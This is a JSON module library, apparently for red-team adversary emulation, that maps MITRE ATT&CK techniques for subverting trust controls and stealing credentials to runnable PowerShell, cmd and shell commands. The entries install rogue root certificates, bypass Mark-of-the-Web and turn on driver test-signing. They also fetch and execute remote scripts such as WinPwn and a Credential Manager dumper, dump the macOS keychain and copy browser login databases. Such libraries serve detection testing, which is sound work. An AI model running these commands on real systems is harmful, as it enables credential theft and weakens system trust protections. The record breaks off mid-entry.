          "install_command": "$cert = New-SelfSignedCertificate -DnsName raglox.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"
        }
      ],
      "rx_module_id": "76f49d86-5eb1-461a-a032-a480f86652f1",
      "module_name": "Install root CA on Windows"
    },
    {
      "index": 1414,
      "technique_id": "T1553.004",
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "description": "Creates a root CA with certutil\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "certutil -addstore my #{pfx_path}\n",
        "elevation_required": true,
        "cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n"
      },
      "variables": [
        {
          "name": "pfx_path",
          "description": "Path of the certificate",
          "type": "path",
          "default_value": "$env:Temp\\rootCA2.cer"
        }
      ],
      "prerequisites": [
        {
          "description": "Certificate must exist at specified location (#{pfx_path})\n",
          "check_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n",
          "install_command": "$cert = New-SelfSignedCertificate -DnsName raglox.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"
        }
      ],
      "rx_module_id": "5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f",
      "module_name": "Install root CA on Windows with certutil"
    },
    {
      "index": 1415,
      "technique_id": "T1553.004",
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "description": "The following RAGLOX test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (IWR 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n",
        "elevation_required": true,
        "cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ca20a3f1-42b5-4e21-ad3f-1049199ec2e0",
      "module_name": "Add Root Certificate to CurrentUser Certificate Store"
    },
    {
      "index": 1416,
      "technique_id": "T1553.005",
      "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
      "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the RAGLOX Threat Library repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\"\n",
        "elevation_required": false,
        "cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n"
      },
      "variables": [
        {
          "name": "path_of_iso",
          "description": "Path to ISO file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1553.005\\bin\\T1553.005.iso"
        }
      ],
      "prerequisites": [
        {
          "description": "T1553.005.iso must exist on disk at specified location (#{path_of_iso})\n",
          "check_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1553.005/bin/T1553.005.iso -OutFile \"#{path_of_iso}\"\n"
        }
      ],
      "rx_module_id": "002cca30-4778-4891-878a-aaffcfa502fa",
      "module_name": "Mount ISO image"
    },
    {
      "index": 1417,
      "technique_id": "T1553.005",
      "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
      "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the RAGLOX Threat Library repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"TestIso\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \"$($driveLetter):\\hello.exe\"\n",
        "elevation_required": true,
        "cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\nStop-process -name \"hello\" -Force -ErrorAction ignore\n"
      },
      "variables": [
        {
          "name": "path_of_iso",
          "description": "Path to ISO file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1553.005\\bin\\FeelTheBurn.iso"
        }
      ],
      "prerequisites": [
        {
          "description": "FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})\n",
          "check_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1553.005/bin/FeelTheBurn.iso -OutFile \"#{path_of_iso}\"\n"
        }
      ],
      "rx_module_id": "42f22b00-0242-4afc-a61b-0da05041f9cc",
      "module_name": "Mount an ISO image and run executable from the ISO"
    },
    {
      "index": 1418,
      "technique_id": "T1553.005",
      "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
      "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Unblock-File -Path #{file_path}\n",
        "elevation_required": false,
        "cleanup_command": "Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n"
      },
      "variables": [
        {
          "name": "file_to_download",
          "description": "File that will be downloaded to test against.",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/README.md"
        },
        {
          "name": "file_path",
          "description": "File to have the Zone.Identifier removed.",
          "type": "string",
          "default_value": "$env:tmp\\ReadMe.md"
        }
      ],
      "prerequisites": [
        {
          "description": "A test file with the Zone.Identifier attribute must be present.",
          "check_command": "if (Test-Path #{file_path}) { EXIT 0 } else { EXIT 1 }\n",
          "install_command": "Invoke-WebRequest #{file_to_download} -OutFile #{file_path}\nSet-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n"
        }
      ],
      "rx_module_id": "64b12afc-18b8-4d3f-9eab-7f6cae7c73f9",
      "module_name": "Remove the Zone.Identifier alternate data stream"
    },
    {
      "index": 1419,
      "technique_id": "T1553.005",
      "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
      "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n",
        "elevation_required": false,
        "cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n"
      },
      "variables": [
        {
          "name": "path_of_iso",
          "description": "Path to ISO file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1553.005\\bin\\AllTheThings.iso"
        }
      ],
      "prerequisites": [
        {
          "description": "AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n",
          "check_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1553.005/bin/AllTheThings.iso -OutFile \"#{path_of_iso}\"\n"
        }
      ],
      "rx_module_id": "c2587b8d-743d-4985-aa50-c83394eaeb68",
      "module_name": "Execute LNK file from ISO"
    },
    {
      "index": 1420,
      "technique_id": "T1553.006",
      "technique_name": "Subvert Trust Controls: Code Signing Policy Modification",
      "description": "Allows adversaries to subvert trust controls by modifying the code signing policy, enabling the execution of unsigned drivers.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "bcdedit /set testsigning on",
        "elevation_required": true,
        "cleanup_command": "bcdedit /set testsigning off"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bb6b51e1-ab92-45b5-aeea-e410d06405f8",
      "module_name": "Code Signing Policy Modification"
    },
    {
      "index": 1421,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToRagloxModulesFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "234f9b7c-b53d-4f32-897b-b880a6c9ea7b",
      "module_name": "Extract Windows Credential Manager via VBA"
    },
    {
      "index": 1422,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "This module will extract the credentials from Windows Credential Manager",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c89becbe-1758-4e7d-a0f4-97d2188a23e3",
      "module_name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]"
    },
    {
      "index": 1423,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "This module will extract the credentials from Windows Credential Manager",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8fd5a296-6772-4766-9991-ff4e92af7240",
      "module_name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]"
    },
    {
      "index": 1424,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "vaultcmd /listcreds:\"Windows Credentials\" /all\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "36753ded-e5c4-4eb5-bc3c-e8fba236878d",
      "module_name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]"
    },
    {
      "index": 1425,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "vaultcmd /listcreds:\"Web Credentials\" /all\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bc071188-459f-44d5-901a-f8f2625b2d2e",
      "module_name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]"
    },
    {
      "index": 1426,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "079ee2e9-6f16-47ca-a635-14efcd994118",
      "module_name": "WinPwn - Loot local Credentials - lazagne"
    },
    {
      "index": 1427,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "afe369c2-b42e-447f-98a3-fb1f4e2b8552",
      "module_name": "WinPwn - Loot local Credentials - Wifi Credentials"
    },
    {
      "index": 1428,
      "technique_id": "T1555",
      "technique_name": "Credentials from Password Stores",
      "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  ",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "db965264-3117-4bad-b7b7-2523b7856b92",
      "module_name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords"
    },
    {
      "index": 1429,
      "technique_id": "T1555.001",
      "technique_name": "Credentials from Password Stores: Keychain",
      "description": "This command will dump keychain credential information from login.keychain. \nSource: https://www.loobins.io/binaries/security/\n\n### Keychain File path\n  ~/Library/Keychains/\n  /Library/Keychains/\n  /Network/Library/Keychains/\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n  ",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo security dump-keychain -d login.keychain",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "88e1fa00-bf63-4e5b-a3e1-e2ea51c8cca6",
      "module_name": "Keychain Dump"
    },
    {
      "index": 1430,
      "technique_id": "T1555.001",
      "technique_name": "Credentials from Password Stores: Keychain",
      "description": "This command finds all certificate items and sends the output to local file in pem format.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "security find-certificate -a -p > #{cert_export}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{cert_export}"
      },
      "variables": [
        {
          "name": "cert_export",
          "description": "Specify the path of the certificates to export.",
          "type": "path",
          "default_value": "/tmp/certs.pem"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1864fdec-ff86-4452-8c30-f12507582a93",
      "module_name": "Export Certificate Item(s)"
    },
    {
      "index": 1431,
      "technique_id": "T1555.001",
      "technique_name": "Credentials from Password Stores: Keychain",
      "description": "This command will import a certificate pem file into a keychain.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "security import #{cert_export} -k\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "cert_export",
          "description": "Specify the path of the pem certificate file to import.",
          "type": "path",
          "default_value": "/tmp/certs.pem"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e544bbcb-c4e0-4bd0-b614-b92131635f59",
      "module_name": "Import Certificate Item(s) into Keychain"
    },
    {
      "index": 1432,
      "technique_id": "T1555.001",
      "technique_name": "Credentials from Password Stores: Keychain",
      "description": "This command will copy the keychain using the cat utility in a manner similar to RAGLOX Stealer.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "cat ~/Library/Keychains/login.keychain-db > #{keychain_export}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{keychain_export}"
      },
      "variables": [
        {
          "name": "keychain_export",
          "description": "Specify the path to copy they keychain into.",
          "type": "path",
          "default_value": "/tmp/keychain"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5c32102a-c508-49d3-978f-288f8a9f6617",
      "module_name": "Copy Keychain using cat utility"
    },
    {
      "index": 1433,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToRagloxModulesFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{file_path}\\Sysinternals\\accesschk.exe\" -ArgumentList \"-accepteula .\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"#{file_path}\\Sysinternals\" -Force -Recurse -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "file_path",
          "description": "File path for modified Sysinternals",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads"
        }
      ],
      "prerequisites": [
        {
          "description": "Modified Sysinternals must be located at #{file_path}\n",
          "check_command": "if (Test-Path \"#{file_path}\\SysInternals\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"#{file_path}\\Modified-SysInternalsSuite.zip\"\nExpand-Archive \"#{file_path}\\Modified-SysInternalsSuite.zip\" \"#{file_path}\\sysinternals\" -Force\nRemove-Item \"#{file_path}\\Modified-SysInternalsSuite.zip\" -Force\n"
        }
      ],
      "rx_module_id": "8c05b133-d438-47ca-a630-19cc464c4622",
      "module_name": "Run Chrome-password Collector"
    },
    {
      "index": 1434,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "search_string",
          "description": "String to search Safari cookies to find.",
          "type": "string",
          "default_value": "coinbase"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c1402f7b-67ca-43a8-b5f3-3143abedc01b",
      "module_name": "Search macOS Safari Cookies"
    },
    {
      "index": 1435,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "The following RAGLOX test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{lazagne_path}\" browsers\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "lazagne_path",
          "description": "Path to LaZagne",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1555.003\\bin\\LaZagne.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n",
          "check_command": "if (Test-Path \"#{lazagne_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{lazagne_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\" -OutFile \"#{lazagne_path}\"\n"
        }
      ],
      "rx_module_id": "9a2915b3-3954-4cce-8c76-00fbf4dbd014",
      "module_name": "LaZagne - Credentials from Browser"
    },
    {
      "index": 1436,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\nRemove-Item -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Login Data For Account\" -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Chrome must be installed\n",
          "check_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
        }
      ],
      "rx_module_id": "3d111226-d09a-4911-8715-fe11664f960d",
      "module_name": "Simulating access to Chrome Login Data"
    },
    {
      "index": 1437,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Opera must be installed\n",
          "check_command": "if (((Test-Path \"$env:LOCALAPPDATA\\Programs\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Opera\\launcher.exe\"))) {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\"\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe\nStart-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'\nStart-Sleep -s 180\nStop-Process -Name \"opera\"\n"
        },
        {
          "description": "Opera login data file must exist\n",
          "check_command": "if (Test-Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -ItemType File\n"
        }
      ],
      "rx_module_id": "28498c17-57e4-495a-b0be-cc1e36de408b",
      "module_name": "Simulating access to Opera Login Data"
    },
    {
      "index": 1438,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToRagloxModulesFolder\\..\\ExternalPayloads\" -Force -Recurse\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Profiles\" -Force -ErrorAction Ignore -Recurse\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Firefox must be installed\n",
          "check_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\"}else {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US\"}\n$installer = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\firefoxsetup.exe\"\n(New-Object Net.WebClient).DownloadFile($url,$installer)\nStart-Process $installer -ArgumentList '/S' -Wait\n"
        },
        {
          "description": "Firefox login data file must exist\n",
          "check_command": "if (Test-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\") {exit 0} else {exit 1}",
          "install_command": "if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"}else {$firefox=\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\"}\nStart-Process $firefox -ArgumentList '-CreateProfile RAGLOX' -Wait\nStart-Process $firefox -NoNewWindow\nStart-Sleep -s 20\nStop-Process -Name firefox\n"
        }
      ],
      "rx_module_id": "eb8da98a-2e16-4551-b3dd-83de49baa14c",
      "module_name": "Simulating access to Windows Firefox Login Data"
    },
    {
      "index": 1439,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
